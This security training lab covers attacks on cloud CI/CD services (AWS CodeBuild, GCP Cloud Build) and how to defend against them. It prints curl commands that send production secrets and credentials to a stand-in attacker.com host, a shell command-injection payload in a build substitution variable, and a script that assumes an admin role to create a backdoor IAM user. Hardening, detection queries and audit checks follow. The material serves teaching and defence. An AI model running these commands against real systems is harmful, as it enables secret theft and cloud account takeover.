# Lab 9.3: Cloud CI/CD Attacks (Beyond GitHub Actions)

<div class="lab-meta">
  <span>~40 minutes</span>
  <span>Advanced</span>
  <span>Prerequisites: <a href="../tier-2/2.1-github-actions-injection.md">Lab 2.1</a></span>
</div>

GitHub Actions injection is well-documented. Security teams know about `${{ github.event.pull_request.title }}` injection and untrusted workflow triggers. But most organizations also use cloud-native CI/CD services: AWS CodePipeline and CodeBuild, GCP Cloud Build, Azure DevOps Pipelines. These services have different trust models, different secret management, and different attack surfaces.

The shared responsibility model is the key difference. With GitHub Actions, GitHub manages the runner infrastructure and you manage the workflow. With cloud-native CI/CD, the cloud provider manages the compute, but the build service has deep integration with IAM, parameter stores, secret managers, and resource APIs. A misconfigured build role does not just leak a GitHub token -- it can give an attacker access to every resource in your cloud account.

In this lab, you will exploit three cloud CI/CD attack vectors: CodeBuild environment variable injection via SSM Parameter Store, Cloud Build substitution variable abuse, and privilege escalation through overprivileged build service roles.

!!! info "Phase 1: UNDERSTAND -- Cloud CI/CD Trust Models"

    **Goal:** Understand how AWS CodeBuild, GCP Cloud Build, and Azure DevOps differ from GitHub Actions in their security model.

### Step 1: Compare CI/CD service trust models

| Property | GitHub Actions | AWS CodeBuild | GCP Cloud Build | Azure DevOps |
|----------|---------------|---------------|-----------------|--------------|
| **Secret storage** | GitHub Secrets (per-repo/org) | SSM Parameter Store (account-wide) | Secret Manager (project-wide) | Azure Key Vault / Variable Groups |
| **Build identity** | GITHUB_TOKEN (scoped) | IAM Role (can be overprivileged) | Service Account (project-level) | Service Connection (subscription-level) |
| **Config file** | `.github/workflows/*.yml` | `buildspec.yml` | `cloudbuild.yaml` | `azure-pipelines.yml` |
| **Config validation** | Limited (syntax check) | None (any YAML accepted) | Schema validation available | Template validation |
| **Secret scoping** | Per-environment, per-repo | By IAM policy on Parameter Store path | By IAM binding on Secret Manager | By variable group scope |
| **Build isolation** | Ephemeral runner | Ephemeral container | Ephemeral container | Agent pool (shared or dedicated) |

**The critical difference:** GitHub Actions secrets are scoped to a repository. SSM Parameter Store parameters are scoped by IAM policy. If the CodeBuild IAM role has `ssm:GetParameter` on `Resource: "*"`, ANY build can read ANY parameter in the account -- including production database passwords.

### Step 2: Examine the vulnerable CodeBuild configuration

This buildspec fetches three production secrets from SSM Parameter Store at build time:

These secrets are available as environment variables during the build. They are logged to CloudWatch in pre_build commands, and passed as `--build-arg` to Docker (which embeds them in image layer history).

### Step 3: Examine the vulnerable Cloud Build configuration

```bash
cat src/cloudbuild-vulnerable.yaml
```

This config uses substitution variables (`_IMAGE_NAME`, `_TEST_COMMAND`, `_WEBHOOK_URL`) that can be user-controlled:

- `_IMAGE_NAME` is injected into a `docker build` command
- `_TEST_COMMAND` is executed directly in a shell
- `_WEBHOOK_URL` can be pointed at an attacker's endpoint

### Step 4: Examine the vulnerable IAM policy

```bash
cat src/iam-policy-vulnerable.json
```

The CodeBuild service role has:

- `ssm:GetParameter` on `Resource: "*"` -- can read any secret
- `s3:*` on `Resource: "*"` -- can access any S3 bucket
- `iam:PassRole` and `sts:AssumeRole` on `Resource: "*"` -- can escalate to any role
- `kms:Decrypt` on `Resource: "*"` -- can decrypt any KMS-encrypted value

!!! warning "Phase 2: BREAK -- Exploiting Cloud CI/CD"

    **Goal:** Execute three attacks against cloud-native CI/CD services.

### Attack 1: CodeBuild environment variable injection

**The setup:** A developer submits a PR that modifies `buildspec.yml`. The PR review focuses on the application code changes. The buildspec change looks minor -- "just updating the build config."

**The exploit:** The modified buildspec adds SSM parameter references for production secrets:

```yaml
env:
  parameter-store:
    PROD_DB_PASSWORD: /prod/database/master-password
    STRIPE_SECRET: /prod/payments/stripe-secret-key
```

Because the CodeBuild role has `ssm:GetParameter` on `*`, the build fetches these secrets and makes them available as environment variables. The attacker's code can then:

```bash
# In the build phase, the attacker adds:
curl -s "https://attacker.com/collect?db=$PROD_DB_PASSWORD&stripe=$STRIPE_SECRET"
```

Or more subtly, embed them in the Docker image:

```bash
docker build --build-arg DB_PASS="$PROD_DB_PASSWORD" -t myapp .
# Now the secret is in the image layer history, visible to anyone with ECR read access
```

**Why it works:** The buildspec is in the source repository. Anyone who can push to the repo (or get a PR merged) can modify it. There is no separate approval process for buildspec changes, and the CodeBuild role does not distinguish between "build secrets" and "production secrets."

### Attack 2: Cloud Build substitution variable abuse

**The exploit:** GCP Cloud Build substitution variables are intended for parameterizing builds (image names, tags, regions). But when injected directly into shell commands, they enable command injection:

```bash
# Attacker triggers a build with:
#   _TEST_COMMAND = "npm test; curl https://attacker.com/$(cat /workspace/credentials.json | base64)"

# The cloudbuild.yaml step executes:
sh -c '${_TEST_COMMAND}'
# Which becomes:
sh -c 'npm test; curl https://attacker.com/$(cat /workspace/credentials.json | base64)'
```

The attacker gets the Cloud Build service account's credentials, which in many projects has `roles/editor` on the entire GCP project.

**Another vector:** Substitution variables in Docker build arguments:

```bash
# _IMAGE_NAME = "my-app --build-arg SECRET=$(gcloud secrets versions access latest --secret=prod-db-password)"

docker build -t gcr.io/$PROJECT_ID/${_IMAGE_NAME} .
# Expands to:
docker build -t gcr.io/myproject/my-app --build-arg SECRET=$(gcloud secrets versions access latest --secret=prod-db-password) .
```

### Attack 3: Overprivileged build service role escalation

**The exploit:** The CodeBuild service role has `sts:AssumeRole` on `*`. During a build, the attacker's code can assume any role in the account:

```bash
# In the build phase:
# Step 1: Assume the admin role
ADMIN_CREDS=$(aws sts assume-role \
    --role-arn arn:aws:iam::123456789012:role/AdminRole \
    --role-session-name "codebuild-escalation")

# Step 2: Use admin credentials to create a backdoor user
export AWS_ACCESS_KEY_ID=$(echo $ADMIN_CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $ADMIN_CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $ADMIN_CREDS | jq -r '.Credentials.SessionToken')

# Step 3: Create persistent access
aws iam create-user --user-name build-service-account
aws iam create-access-key --user-name build-service-account
aws iam attach-user-policy --user-name build-service-account \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

The attacker now has permanent admin access to the AWS account via a backdoor IAM user, even after the build finishes and the temporary credentials expire.

!!! success "Phase 3: DEFEND -- Hardening Cloud CI/CD"

    **Goal:** Apply least-privilege IAM, validate build configs, encrypt parameters, and isolate build environments.

### Fix 1: Scope SSM Parameter access

```bash
cat src/iam-policy-hardened.json
```

Compare the vulnerable and hardened IAM policies:

| Permission | Vulnerable | Hardened |
|-----------|-----------|---------|
| SSM GetParameter | `Resource: "*"` | `Resource: "arn:...parameter/build/*"` with tag condition |
| S3 | `s3:*` on `*` | `s3:GetObject, s3:PutObject` on specific bucket |
| ECR | `ecr:*` on `*` | Specific push actions on one repository |
| IAM/STS | `iam:PassRole, sts:AssumeRole` on `*` | **Explicit Deny** on `iam:*, sts:AssumeRole, organizations:*` |
| KMS | `kms:Decrypt` on `*` | `kms:Decrypt` on one specific key |

**Key principle:** Build-time secrets live under `/build/*` in Parameter Store. Production secrets live under `/prod/*`. The build role can ONLY access `/build/*`. The `Deny` statement on IAM and STS prevents role escalation.

### Fix 2: Validate Cloud Build substitution variables

```bash
cat src/cloudbuild-hardened.yaml
```

The hardened config adds:

1. **Input validation step** -- runs first, checks all substitution variables against regex patterns
2. **Fixed test command** -- `npm test` is hardcoded, not a substitution variable
3. **`MUST_MATCH` substitution option** -- rejects any undefined substitutions
4. **Explicit service account** -- uses a dedicated build service account, not the project default

```yaml
# Validation step
- name: 'gcr.io/cloud-builders/docker'
  entrypoint: 'bash'
  args:
    - '-euo'
    - 'pipefail'
    - '-c'
    - |
      if [[ ! "${_IMAGE_NAME}" =~ ^[a-zA-Z0-9_-]+$ ]]; then
        echo "ERROR: Invalid _IMAGE_NAME"
        exit 1
      fi
```

### Fix 3: Harden the CodeBuild buildspec

```bash
cat src/buildspec-hardened.yml
```

Changes from vulnerable to hardened:

1. **Only build-scoped parameters** -- `NPM_TOKEN` and `ECR_HELPER` from `/build/*`, not production secrets
2. **Secrets Manager with KMS** -- signing key retrieved from Secrets Manager (encrypted at rest)
3. **No secrets in logs** -- all echo statements sanitized, no `${SECRET:0:4}` output
4. **Input validation** -- commit hash validated as 40-character hex before use
5. **BuildKit secrets** -- Docker `--secret` mount instead of `--build-arg` (secrets not stored in image layers)
6. **Post-install script disabled** -- `npm ci --ignore-scripts` prevents malicious postinstall scripts during build

### Fix 4: Implement build config change detection

Add a pre-merge check that flags any changes to build configuration files:

```bash
# In your CI pipeline, BEFORE the build runs:
CHANGED_FILES=$(git diff --name-only HEAD~1)

for f in buildspec.yml cloudbuild.yaml azure-pipelines.yml .github/workflows/*; do
    if echo "$CHANGED_FILES" | grep -q "$f"; then
        echo "WARNING: Build configuration changed: $f"
        echo "This change requires security team review."
        # Send to Slack, create JIRA ticket, block merge until approved
    fi
done
```

!!! danger "Phase 4: DETECT -- Monitoring Cloud CI/CD Abuse"

    **Goal:** Detect secret access, privilege escalation, and build config tampering using CloudTrail and SIEM.

### CloudTrail Indicators

| Event | What It Means | Severity |
|-------|--------------|----------|
| `GetParameter` with path `/prod/*` from CodeBuild | Build reading production secrets | Critical |
| `AssumeRole` from CodeBuild to non-build role | Privilege escalation attempt | Critical |
| `CreateUser` or `CreateAccessKey` from CodeBuild | Backdoor creation | Critical |
| `PutParameter` from CodeBuild | Build modifying Parameter Store | High |
| Build duration > 3x normal | Possible exfiltration or crypto mining | Medium |

### Build Duration Anomaly Detection

Build duration spikes can indicate:

- Exfiltration (uploading data to an external endpoint adds time)
- Crypto mining (build compute used for mining)
- Privilege escalation (additional API calls take time)
- Data staging (copying S3 buckets/DynamoDB tables)

```yaml
index=cloudtrail eventName="StopBuild" OR eventName="BatchGetBuilds"
| spath output=build_status path=responseElements.build.buildStatus
| spath output=duration path=responseElements.build.phases{}.durationInSeconds
| stats avg(duration) as avg_duration, stdev(duration) as stdev_duration by project_name
| where duration > (avg_duration + 3 * stdev_duration)
| eval severity="medium"
| table _time, project_name, duration, avg_duration, severity
```

!!! tip "SOC Relevance"

    **Alerts you will see:**

    - "CodeBuild project accessed production SSM parameters" (CloudTrail)
    - "IAM role assumption from build service to non-build role" (CloudTrail)
    - "Build configuration file modified in PR" (GitHub/GitLab audit)
    - "Build duration anomaly detected" (CloudWatch)
    - "New IAM user created from build service principal" (CloudTrail)

    **Why this matters to your SOC:** Cloud CI/CD services are high-value targets because they have IAM roles with significant permissions. A compromised build can access secrets, push container images, deploy to production, and create persistent backdoor accounts. Unlike a compromised developer laptop (which you can isolate), a compromised build runs inside your cloud account with cloud-level permissions.

    **Triage workflow:**

    1. **Identify the build project** -- which CodeBuild project or Cloud Build trigger fired?
    2. **Check the buildspec/cloudbuild.yaml** -- was the build config modified recently? By whom?
    3. **Check the IAM role** -- what permissions does the build service role have? Was `AssumeRole` called?
    4. **Check SSM/Secrets Manager access** -- did the build access parameters outside its normal scope?
    5. **Check for persistence** -- were any IAM users, roles, or access keys created during the build?
    6. **Review the source commit** -- what code change triggered this build? Was the PR reviewed?

    **False positive rate:** Low for critical alerts (production secret access, AssumeRole escalation). Medium for build duration anomalies (network issues, dependency download times, and cache misses cause legitimate spikes).

!!! example "CI Integration"

    Gate build config changes with automated security checks.

    **`.github/workflows/build-config-audit.yml`:**

    ```yaml
    name: Build Config Security Audit

    on:
      pull_request:
        paths:
          - "buildspec*.yml"
          - "cloudbuild*.yaml"
          - "azure-pipelines*.yml"

    jobs:
      audit-build-config:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
            with:
              fetch-depth: 0

          - name: Flag build config changes for security review
            run: |
              echo "::warning::Build configuration changed -- requires security team review"

          - name: Check for production secret references
            run: |
              for f in buildspec*.yml cloudbuild*.yaml; do
                [ -f "$f" ] || continue
                if grep -iE '(/prod/|production|master-password|stripe|secret-key)' "$f"; then
                  echo "::error file=$f::Build config references production secrets"
                  exit 1
                fi
              done
              echo "PASS: No production secret references found."

          - name: Check for overprivileged IAM references
            run: |
              for f in $(find . -name "*.json" -path "*/iam*"); do
                if grep -q '"Resource": "\*"' "$f"; then
                  echo "::error file=$f::IAM policy uses wildcard Resource"
                  exit 1
                fi
                if grep -qE '"Action":\s*"\*"' "$f"; then
                  echo "::error file=$f::IAM policy uses wildcard Action"
                  exit 1
                fi
              done
              echo "PASS: No wildcard IAM policies found."

          - name: Check for command injection vectors
            run: |
              for f in cloudbuild*.yaml; do
                [ -f "$f" ] || continue
                if grep -E '\$\{_[A-Z_]+\}' "$f" | grep -E "(sh -c|bash -c|entrypoint.*bash)"; then
                  echo "::error file=$f::Substitution variable used in shell execution -- command injection risk"
                  exit 1
                fi
              done
              echo "PASS: No command injection vectors detected."
    ```

## What You Learned

1. **Cloud CI/CD services have deeper IAM integration than GitHub Actions** -- a misconfigured build role can access any secret, any S3 bucket, and any IAM role in the account.
2. **Build config files are attack vectors** -- modifying `buildspec.yml` or `cloudbuild.yaml` is equivalent to modifying the CI pipeline, and these changes often bypass code review.
3. **SSM Parameter Store is account-wide** -- without path-scoped IAM policies, builds can read production secrets.
4. **Substitution variables enable command injection** -- user-controllable values injected into shell commands are a classic injection pattern.
5. **Explicit Deny on IAM/STS prevents escalation** -- the hardened policy includes a Deny statement that blocks the build from assuming other roles, even if Allow statements are overly broad.
